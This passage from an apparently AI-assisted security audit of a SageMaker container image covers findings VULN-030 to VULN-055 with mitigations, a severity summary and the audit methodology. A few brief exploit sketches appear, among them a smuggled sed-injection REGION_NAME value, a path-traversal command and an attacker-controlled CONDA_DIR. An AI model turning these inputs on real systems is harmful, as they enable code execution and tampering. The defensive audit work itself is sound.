- Sink: `605_bake_rsession_gateway.sh:26` — `source ${CONDA_DIR}/bin/deactivate`
**Exploit sketch:**
```
CONDA_DIR=/attacker/controlled/path
# source loads and executes /attacker/controlled/path/bin/activate
```
**Mitigation:** Validate CONDA_DIR exists and is within expected prefix; quote the variable
**Deduplication notes:** Unique to rsession gateway script.

---

### VULN-031
**Title:** Docker GPG key download via curl without fingerprint verification
**Severity:** High — Rogue APT signing key installation
**Type:** RCE / Supply Chain
**GET-Triggerable:** No — startup/install
**Endpoint(s):** N/A
**Parameter(s)/Cookie(s):** N/A
**Evidence:**
- Sink: `etc/sagemaker-ui/workflows/start-workflows-container.sh:116` — `curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo gpg --dearmor -o /etc/apt/keyrings/docker.gpg`
- No fingerprint verification of the downloaded key
**Exploit sketch:**
```
# MITM or compromised CDN → rogue GPG key → controls all future apt installs
```
**Mitigation:** Verify GPG key fingerprint after download
**Deduplication notes:** Unique supply chain vector.

---

### VULN-032
**Title:** sudo apt-get install with unquoted VERSION_ID in grep
**Severity:** Medium — Package version manipulation
**Type:** RCE / Command Injection
**GET-Triggerable:** No
**Endpoint(s):** N/A
**Parameter(s)/Cookie(s):** `VERSION_ID` from `/etc/os-release`
**Evidence:**
- Sink: `etc/sagemaker-ui/workflows/start-workflows-container.sh:124` — `grep -i $VERSION_ID` (unquoted)
- Lines 113-125: `sudo apt-get install docker-ce-cli=$VERSION_STRING -y`
**Mitigation:** Quote `$VERSION_ID`; validate against expected pattern
**Deduplication notes:** Unique to docker installation.

---

### VULN-033
**Title:** User-controlled startup.sh executed in workflow container
**Severity:** Medium — Code execution in workflow container
**Type:** RCE / Code Injection
**GET-Triggerable:** No
**Endpoint(s):** N/A
**Parameter(s)/Cookie(s):** `${PROJECT_DIR}/workflows/config/startup.sh`
**Evidence:**
- Sink: `etc/sagemaker-ui/workflows/start-workflows-container.sh:147` — `tail -n +2 $USER_STARTUP_FILE >> "${WORKFLOW_STARTUP_PATH}startup.sh"`
- User-controllable file content appended to system startup script and executed
**Mitigation:** Validate/sanitize startup script content; run in restricted sandbox
**Deduplication notes:** Similar to VULN-011 (user-controlled files → execution).

---

### VULN-034
**Title:** User-controlled requirements.txt in workflow container
**Severity:** Medium — Dependency confusion in workflow container
**Type:** RCE / Supply Chain
**GET-Triggerable:** No
**Endpoint(s):** N/A
**Parameter(s)/Cookie(s):** `${PROJECT_DIR}/workflows/config/requirements.txt`
**Evidence:**
- Sink: `etc/sagemaker-ui/workflows/start-workflows-container.sh:159` — `cat $USER_REQUIREMENTS_FILE >> "${WORKFLOW_REQUIREMENTS_PATH}requirements.txt"`
**Mitigation:** Validate requirements; use `--require-hashes`
**Deduplication notes:** Similar pattern to VULN-012, different container context.

---

### VULN-035
**Title:** PATH hijacking via `which docker` in stop-workflows script
**Severity:** Medium — Execute malicious binary instead of docker
**Type:** RCE / Command Injection
**GET-Triggerable:** No
**Endpoint(s):** N/A
**Parameter(s)/Cookie(s):** `PATH` env var
**Evidence:**
- Sink: `etc/sagemaker-ui/workflows/stop-workflows-container.sh:6` — `DOCKER_EXECUTABLE=$(which docker)`
- Sink: `stop-workflows-container.sh:13` — `$DOCKER_EXECUTABLE compose ...` (unquoted)
**Mitigation:** Use absolute path `/usr/bin/docker`
**Deduplication notes:** Unique to stop-workflows.

---

### VULN-036
**Title:** File path traversal in merge-settings-util.py
**Severity:** Medium — Arbitrary file read/write via CLI args
**Type:** Other Injection (Path Traversal)
**GET-Triggerable:** No — CLI tool
**Endpoint(s):** N/A
**Parameter(s)/Cookie(s):** `argv[1]`, `argv[2]`
**Evidence:**
- Source: `usr/local/bin/merge-settings-util.py:7` — `file1, file2 = argv[1], argv[2]`
- Sink: `merge-settings-util.py:9` — `open(file1, "r")`, `open(file2, "r")`
- Sink: `merge-settings-util.py:17` — `open(file1, "w")` — overwrites file1 with merged result
**Exploit sketch:**
```
python merge-settings-util.py /etc/sensitive-config.json /tmp/attacker-data.json
```
**Mitigation:** Validate paths are within expected config directory
**Deduplication notes:** Unique utility file.

---

### VULN-037
**Title:** TOCTOU race conditions in file operations across startup scripts
**Severity:** Medium — Symlink attacks during check-then-act patterns
**Type:** Other Injection (Race Condition)
**GET-Triggerable:** No
**Endpoint(s):** N/A
**Parameter(s)/Cookie(s):** N/A
**Evidence:**
- `etc/sagemaker-ui/workflows/start-workflows-container.sh:76-79` — check file exists → write
- `start-workflows-container.sh:146-147` — check startup file → read
- `start-workflows-container.sh:158-159` — check requirements file → read
- `etc/sagemaker-ui/set_code_editor_theme.sh:9-13` — check → create file
**Mitigation:** Use atomic file operations; use `mktemp` with restricted permissions
**Deduplication notes:** Pattern across multiple scripts.

---

### VULN-038
**Title:** Unvalidated JSON metadata consumed without schema validation
**Severity:** Medium — Malformed metadata causes cascading failures
**Type:** Other Injection (Input Validation)
**GET-Triggerable:** No
**Endpoint(s):** N/A
**Parameter(s)/Cookie(s):** `/opt/ml/metadata/resource-metadata.json`
**Evidence:**
- All startup scripts trust this file completely
- No JSON schema validation in any consumer
- `sagemaker_ui_post_startup.sh:49-54`, `network_validation.sh:41-45`, `git_clone.sh:7-10`, `start-workflows-container.sh:14-22`
**Mitigation:** Validate all extracted fields against expected format before use
**Deduplication notes:** Root cause for VULN-001 through VULN-004.

---

### VULN-039
**Title:** Error messages leak internal paths and configuration
**Severity:** Medium — Information disclosure aids further attacks
**Type:** Other Injection (Information Disclosure)
**GET-Triggerable:** Maybe — Tornado exception handler returns details
**Endpoint(s):** `/invocations` (on error)
**Parameter(s)/Cookie(s):** N/A
**Evidence:**
- `etc/sagemaker-inference-server/tornado_server/server.py:46` — logs full code path
- `server.py:123` — exception reveals full filesystem path
- `server.py:126` — exception reveals env var value
- `etc/sagemaker/sm_pysdk_default_config.py:102,106,113` — exceptions leak metadata
- `etc/sagemaker-ui/workflows/workflow_client.py:17` — response body in exception
**Mitigation:** Use generic error messages in production; log details separately
**Deduplication notes:** Pattern across multiple files.

---

### VULN-040
**Title:** XSRF token transmitted over plain HTTP
**Severity:** Medium — Token interception on shared network
**Type:** Other Injection (Cookie Security)
**GET-Triggerable:** Yes — GET request populates XSRF cookie
**Endpoint(s):** `GET http://default:8888/jupyterlab/default/`
**Parameter(s)/Cookie(s):** `_xsrf` cookie
**Evidence:**
- Source: `etc/sagemaker-ui/workflows/workflow_client.py:128` — `session.get(JUPYTERLAB_URL)` over HTTP
- `workflow_client.py:8` — `JUPYTERLAB_URL = "http://default:8888/jupyterlab/default/"`
- Lines 23, 36, 45: XSRF token extracted and sent over HTTP
**Exploit sketch:**
```
# Network sniffing captures: Cookie: _xsrf=<token>
# Replay token to submit forged requests
```
**Mitigation:** Use HTTPS for all API calls; set Secure flag on cookies
**Deduplication notes:** Unique cookie security issue.

---

### VULN-041
**Title:** Silent exception swallowing in streaming handler
**Severity:** Low — Data corruption goes undetected
**Type:** Other Injection (Data Integrity)
**GET-Triggerable:** No — POST only
**Endpoint(s):** `POST /invocations` (streaming mode)
**Parameter(s)/Cookie(s):** N/A
**Evidence:**
- Sink: `etc/sagemaker-inference-server/tornado_server/stream_handler.py:41-43` — `except Exception as e: logger.error("..."); break`
- Exception detail (`e`) not included in log message
- Client receives truncated response with 200 status
**Mitigation:** Include exception in log; send error marker before closing stream
**Deduplication notes:** Unique to streaming handler.

---

### VULN-042
**Title:** Log level manipulation / DoS via non-numeric env var
**Severity:** Low — Server crash or log suppression
**Type:** Other Injection (DoS)
**GET-Triggerable:** No
**Endpoint(s):** N/A
**Parameter(s)/Cookie(s):** `SAGEMAKER_INFERENCE_LOG_LEVEL` env var
**Evidence:**
- Source: `etc/sagemaker-inference-server/utils/environment.py:30` — `os.getenv(SageMakerInference.LOG_LEVEL, 10)`
- Sink: `etc/sagemaker-inference-server/tornado_server/server.py:38` — `logger.setLevel(int(...))`
- Non-numeric value → ValueError crash; level=50 → suppress all logs
**Mitigation:** Validate log level is in {10,20,30,40,50}; handle ValueError
**Deduplication notes:** Unique to inference server.

---

### VULN-043
**Title:** CODE env var split() crash on malformed input
**Severity:** Low — DoS at startup
**Type:** Other Injection (DoS)
**GET-Triggerable:** No
**Endpoint(s):** N/A
**Parameter(s)/Cookie(s):** `SAGEMAKER_INFERENCE_CODE` env var
**Evidence:**
- Sink: `etc/sagemaker-inference-server/tornado_server/server.py:102` — `inference_module_name, handle_name = self._environment.code.split(".")`
- More than one dot or no dot → ValueError
**Mitigation:** Use `rsplit(".", 1)`; wrap in try/except
**Deduplication notes:** Related to VULN-005.

---

### VULN-044
**Title:** Unquoted $DESTINATION_PATH in git_clone.sh
**Severity:** Medium — Word splitting on path with spaces
**Type:** RCE / Command Injection
**GET-Triggerable:** No
**Endpoint(s):** N/A
**Parameter(s)/Cookie(s):** `$1` argument or default `$HOME/src`
**Evidence:**
- Source: `etc/sagemaker-ui/git_clone.sh:13` — `DESTINATION_PATH=${1:-$DEFAULT_DESTINATION_PATH}`
- Sink: `git_clone.sh:24` — `git clone codecommit::$AWS_REGION://$repoName $DESTINATION_PATH` (unquoted)
- Sink: `git_clone.sh:28-29` — `if [ -d $DESTINATION_PATH ]` then `rm -rf $DESTINATION_PATH` (unquoted!)
**Mitigation:** Quote all variable expansions
**Deduplication notes:** Related to VULN-010, different unquoted variables.

---

### VULN-045
**Title:** Unquoted glob expansion in workflow plugin copy
**Severity:** Medium — Unexpected file matching via glob
**Type:** Other Injection (Path Traversal)
**GET-Triggerable:** No
**Endpoint(s):** N/A
**Parameter(s)/Cookie(s):** Files in project workflows/config/plugins/
**Evidence:**
- Sink: `etc/sagemaker-ui/workflows/start-workflows-container.sh:138` — `cp $WORKFLOW_PLUGINS_SOURCE_PATH $WORKFLOW_PLUGINS_PATH` (contains *.whl glob)
- Sink: `start-workflows-container.sh:170` — `cp -r $USER_PLUGINS_FOLDER/* $WORKFLOW_PLUGINS_PATH` (user-controlled dir + glob)
**Mitigation:** Quote variables; use find + xargs for controlled file operations
**Deduplication notes:** Same file as VULN-033/034, different mechanism.

---

### VULN-046
**Title:** Unquoted healthcheck body passed to jq
**Severity:** Medium — Health status manipulation via response injection
**Type:** Other Injection (Data Integrity)
**GET-Triggerable:** No
**Endpoint(s):** N/A (internal healthcheck)
**Parameter(s)/Cookie(s):** HTTP response body
**Evidence:**
- Sink: `etc/sagemaker-ui/workflows/healthcheck.sh:23` — `echo $body | jq -r '...'` ($body unquoted)
- Source: HTTP response from `localhost:8080/api/v1/health` (line 5)
- Unquoted expansion corrupts JSON if body contains spaces/globs
**Exploit sketch:**
```
# Crafted health response body with shell metacharacters → jq parsing fails → wrong status
```
**Mitigation:** Quote: `echo "$body" | jq -r '...'`
**Deduplication notes:** Unique to healthcheck.

---

### VULN-047
**Title:** Unauthenticated HTTP health endpoint
**Severity:** Medium — Health status spoofing on shared network
**Type:** Other Injection (Authentication Bypass)
**GET-Triggerable:** Yes — plain HTTP GET
**Endpoint(s):** `GET http://default:8888/jupyterlab/default/proxy/absolute/8080/api/v1/health`
**Parameter(s)/Cookie(s):** None
**Evidence:**
- `etc/sagemaker-ui/workflows/healthcheck.sh:5` — plain HTTP with no auth token
**Mitigation:** Add authentication; use HTTPS
**Deduplication notes:** Related to VULN-040 (same HTTP concern).

---

### VULN-048
**Title:** Unsanitized request object passed directly to user handler
**Severity:** Medium — All request fields (headers, cookies, query) accessible without filtering
**Type:** Other Injection (Input Validation)
**GET-Triggerable:** No — POST /invocations only
**Endpoint(s):** `POST /invocations`
**Parameter(s)/Cookie(s):** All Tornado HTTPRequest fields
**Evidence:**
- Sink: `etc/sagemaker-inference-server/tornado_server/async_handler.py:35` — `response = await self._handler(self.request)`
- Sink: `sync_handler.py:36` — same pattern
- Full request object includes: body, headers, cookies, arguments, query, files, remote_ip
**Mitigation:** Wrap request in a sanitized facade; document trusted fields
**Deduplication notes:** Unique to inference server.

---

### VULN-049
**Title:** SM_EXECUTION_INPUT_PATH controls sparkmagic config directory
**Severity:** Medium — Path injection via environment variable
**Type:** Other Injection (Path Traversal)
**GET-Triggerable:** No
**Endpoint(s):** N/A
**Parameter(s)/Cookie(s):** `SM_EXECUTION_INPUT_PATH` env var
**Evidence:**
- Source: `etc/sagemaker-ui/kernels/kernel_launchers/python3_kernel_launcher.sh:7` — `export SPARKMAGIC_CONF_DIR="$SM_EXECUTION_INPUT_PATH"`
- Sink: `python3_kernel_launcher.sh:11` — `mkdir -p $SPARKMAGIC_CONF_DIR` (unquoted)
- Sink: `python3_kernel_launcher.sh:15-49` — config file creation in this directory
**Mitigation:** Validate path; quote all expansions
**Deduplication notes:** Same file as VULN-020, different variable.

---

### VULN-050
**Title:** Regex DoS in S3 path extraction
**Severity:** Low — Application crash on malformed metadata
**Type:** Other Injection (DoS)
**GET-Triggerable:** No
**Endpoint(s):** N/A
**Parameter(s)/Cookie(s):** `ProjectS3Path` from metadata
**Evidence:**
- Sink: `etc/sagemaker/sm_pysdk_default_config.py:85` — `re.search(r"s3://([^/]+)/", s3_path).group(1)`
- If `s3_path` doesn't match → `AttributeError: 'NoneType' object has no attribute 'group'`
- Sink: `sm_pysdk_default_config.py:87` — `s3_path.split("//")[1].split("/", 1)[1]` — IndexError on malformed input
**Mitigation:** Add null checks after regex match; validate S3 path format
**Deduplication notes:** Unique to PySDK config.

---

### VULN-051
**Title:** MCP server log injection via untrusted operation/tool names
**Severity:** Low — Log file pollution
**Type:** Other Injection (Log Injection)
**GET-Triggerable:** No — stdio transport
**Endpoint(s):** MCP stdio
**Parameter(s)/Cookie(s):** `operation`, `tool_name` parameters
**Evidence:**
- Sink: `etc/sagemaker-ui/sagemaker-mcp/smus-mcp.py:125-126` — `log_file.write(json.dumps(log_entry) + "\n")`
- `json.dumps()` prevents injection, but if log consumers parse the file as structured logs, CloudWatch metrics (line 109-117) could be polluted with fake operation names
**Mitigation:** Validate operation and tool_name against allowlist
**Deduplication notes:** Unique to MCP server.

---

### VULN-052
**Title:** Unquoted REGION_NAME in sed replacement of MCP config
**Severity:** Medium — sed injection via environment variable
**Type:** RCE / Command Injection
**GET-Triggerable:** No
**Endpoint(s):** N/A
**Parameter(s)/Cookie(s):** `REGION_NAME` env var
**Evidence:**
- Sink: `etc/sagemaker-ui/sagemaker_ui_post_startup.sh:332` — `sed -i "s/AWS_REGION_NAME/$REGION_NAME/g" "$target_file"`
- If `REGION_NAME` contains sed metacharacters (e.g., `/`, `&`, `\`), the sed command breaks or injects content
**Exploit sketch:**
```
REGION_NAME="us-east-1/e; s/.*/malicious/g"
# sed interprets embedded metacharacters → file corruption
```
**Mitigation:** Escape REGION_NAME for sed context; or use jq for JSON manipulation
**Deduplication notes:** Unique sed injection.

---

### VULN-053
**Title:** Docker compose environment variables from unvalidated metadata
**Severity:** Medium — Container configuration manipulation
**Type:** Other Injection (Container Escape)
**GET-Triggerable:** No
**Endpoint(s):** N/A
**Parameter(s)/Cookie(s):** Multiple metadata-derived env vars
**Evidence:**
- Sink: `etc/sagemaker-ui/workflows/start-workflows-container.sh:185-194` — Multiple unvalidated metadata values passed as env vars to `docker compose`:
  ```
  PROJECT_DIR=$(basename $PROJECT_DIR)
  DZ_DOMAIN_ID=$DZ_DOMAIN_ID
  DZ_PROJECT_S3PATH=$DZ_PROJECT_S3PATH
  docker compose -f ... up -d
  ```
**Mitigation:** Validate all env vars before passing to docker compose
**Deduplication notes:** Related to VULN-038 (metadata validation).

---

### VULN-054
**Title:** Unquoted git-editor.sh environment variable
**Severity:** Medium — Command injection via VSCODE_GIT_EDITOR_EXTRA_ARGS
**Type:** RCE / Command Injection
**GET-Triggerable:** No — triggers during git commit
**Endpoint(s):** N/A
**Parameter(s)/Cookie(s):** `VSCODE_GIT_EDITOR_EXTRA_ARGS` env var
**Evidence:**
- Sink: `opt/conda/share/sagemaker-code-editor/extensions/git/dist/git-editor.sh:4` — `$VSCODE_GIT_EDITOR_EXTRA_ARGS "$@"` (env var unquoted)
**Mitigation:** Quote: `"$VSCODE_GIT_EDITOR_EXTRA_ARGS" "$@"`
**Deduplication notes:** Related to VULN-028, different script.

---

### VULN-055
**Title:** Predictable temp file in askpass.sh creates symlink race
**Severity:** Low — TOCTOU on temp file
**Type:** Other Injection (Race Condition)
**GET-Triggerable:** No
**Endpoint(s):** N/A
**Parameter(s)/Cookie(s):** Temp file from `mktemp`
**Evidence:**
- `opt/conda/share/sagemaker-code-editor/extensions/git/dist/askpass.sh:2` — `VSCODE_GIT_ASKPASS_PIPE=\`mktemp\``
- Lines 4-5: `cat $VSCODE_GIT_ASKPASS_PIPE` then `rm $VSCODE_GIT_ASKPASS_PIPE` (unquoted)
- Same in `ssh-askpass.sh:2,4-5`
**Mitigation:** Quote temp file path; use mktemp with restrictive permissions
**Deduplication notes:** Related to VULN-028, different aspect.

---

## SUMMARY BY SEVERITY

| Severity | Count | IDs |
|----------|-------|-----|
| **Critical** | 6 | VULN-001, 002, 003, 006, 019, 020 |
| **High** | 14 | VULN-004, 005, 007, 008, 009, 010, 011, 012, 018, 021, 025, 028, 029, 031 |
| **Medium** | 23 | VULN-013, 014, 016, 017, 022, 026, 027, 032, 033, 034, 035, 036, 037, 038, 039, 040, 044, 045, 046, 047, 048, 049, 052, 053, 054 |
| **Low** | 9 | VULN-015, 023, 024, 041, 042, 043, 050, 051, 055 |

## TOP 20 MOST DANGEROUS FLOWS

1. **resource-metadata.json → bash -c** (VULN-001) — Critical RCE
2. **resource-metadata.json → credential_process** (VULN-002) — Persistent RCE
3. **API response → .bashrc** (VULN-003) — Persistent RCE
4. **resource-metadata.json → git credential helper** (VULN-004) — RCE on git ops
5. **Env vars → module loading → exec_module** (VULN-005) — Arbitrary code execution
6. **Root Jupyter on 0.0.0.0** (VULN-006) — Unauthenticated root access
7. **Missing Jupyter auth token** (VULN-007) — Authentication bypass
8. **Hidden file access** (VULN-008) — Credential theft via API
9. **Null CSP header** (VULN-009) — All XSS protections disabled
10. **API response → git clone ext::** (VULN-010) — RCE via git transport
11. **.libs.json → conda install** (VULN-011) — Supply chain RCE
12. **requirements.txt → pip install** (VULN-012) — Supply chain RCE
13. **curl | sudo tar | sudo exec** (VULN-019) — Root supply chain RCE
14. **Unvalidated kernel_type → exec** (VULN-020) — Direct command injection
15. **Root bash terminal** (VULN-021) — Interactive root shell
16. **DataZone endpoint → SSRF** (VULN-018) — AWS credential theft
17. **AWS --debug flag** (VULN-025) — Credential disclosure in logs
18. **askpass.sh unquoted $*** (VULN-028) — Command injection
19. **/tmp/ pip install** (VULN-029) — Binary replacement attack
20. **source with env-controlled path** (VULN-030) — Arbitrary code execution

## METHODOLOGY

- **Total agents used:** 30+ (3 Phase 1 enumeration agents, 8+ Phase 2 deep analysis agents, each file reviewed by 2+ agents with cross-checking)
- **Agent specializations:** Route/handler discovery, query param/cookie analysis, injection sink detection, RCE/command injection, XSS/cookie analysis, Tornado handler deep review, workflow script analysis, SSRF/path traversal/deserialization, Jupyter config security, cross-file dataflow, POST→GET convertibility
- **Files analyzed:** All shell scripts (104), key Python application files (18), JavaScript server files (5), configuration files (12)
- **Excluded:** node_modules, .git, conda-meta, standard library Python files, vendored IDE extensions (except where they define HTTP handlers or have known vulnerability patterns)
